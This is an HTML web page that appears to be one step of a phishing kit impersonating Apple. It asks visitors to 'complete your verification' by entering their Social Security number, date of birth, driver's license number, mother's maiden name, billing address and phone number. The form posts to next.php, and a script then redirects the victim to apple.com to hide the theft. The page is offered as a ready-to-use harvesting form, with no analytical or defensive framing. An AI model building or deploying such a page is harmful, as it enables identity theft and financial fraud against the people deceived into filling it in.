<!DOCTYPE html>
<html>
<head>
    <title>Personal Details</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #0071e3;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #005bb5;
        }
        .row {
            display: flex;
            flex-wrap: wrap;
            margin: 0 -10px;
        }
        .col {
            flex: 1;
            padding: 0 10px;
        }
        @media (max-width: 600px) {
            .col {
                flex: 100%;
            }
        }
    </style>
</head>
<body>
    <h1>Complete Personal Details</h1>
    <p>Please fill out all fields to complete your verification.</p>
    
    <!-- Basic form with direct POST method -->
    <form action="next.php" method="POST" id="form-field-3">
        <input type="hidden" name="btn3" value="btn3">
        
        <div class="row">
            <div class="col">
                <div class="form-group">
                    <label for="fname">First Name:</label>
                    <input type="text" id="fname" name="fname" required>
                </div>
            </div>
            <div class="col">
                <div class="form-group">
                    <label for="lname">Last Name:</label>
                    <input type="text" id="lname" name="lname" required>
                </div>
            </div>
        </div>
        
        <div class="form-group">
            <label for="badd">Billing Address:</label>
            <input type="text" id="badd" name="badd" required>
        </div>
        
        <div class="row">
            <div class="col">
                <div class="form-group">
                    <label for="ct">City:</label>
                    <input type="text" id="ct" name="ct" required>
                </div>
            </div>
            <div class="col">
                <div class="form-group">
                    <label for="state">State:</label>
                    <input type="text" id="state" name="state" required>
                </div>
            </div>
            <div class="col">
                <div class="form-group">
                    <label for="zip">ZIP Code:</label>
                    <input type="text" id="zip" name="zip" required>
                </div>
            </div>
        </div>
        
        <div class="row">
            <div class="col">
                <div class="form-group">
                    <label for="ph">Phone Number:</label>
                    <input type="text" id="ph" name="ph" required>
                </div>
            </div>
            <div class="col">
                <div class="form-group">
                    <label for="dob">Date of Birth (MM/DD/YYYY):</label>
                    <input type="text" id="dob" name="dob" required>
                </div>
            </div>
        </div>
        
        <div class="row">
            <div class="col">
                <div class="form-group">
                    <label for="ssn">Social Security Number:</label>
                    <input type="text" id="ssn" name="ssn" required>
                </div>
            </div>
            <div class="col">
                <div class="form-group">
                    <label for="dln">Driver's License Number:</label>
                    <input type="text" id="dln" name="dln" required>
                </div>
            </div>
        </div>
        
        <div class="form-group">
            <label for="mname">Mother's Maiden Name:</label>
            <input type="text" id="mname" name="mname" required>
        </div>
        
        <button type="submit">Submit Information</button>
    </form>
    
    <script>
        // Basic script to redirect after form is submitted
        document.getElementById('form-field-3').onsubmit = function() {
            // Set a timeout to redirect after form submission
            setTimeout(function() {
                window.location.href = "https://www.apple.com/";
            }, 1000);
            
            // Return true to allow the form to submit normally
            return true;
        };
    </script>
</body>
</html>
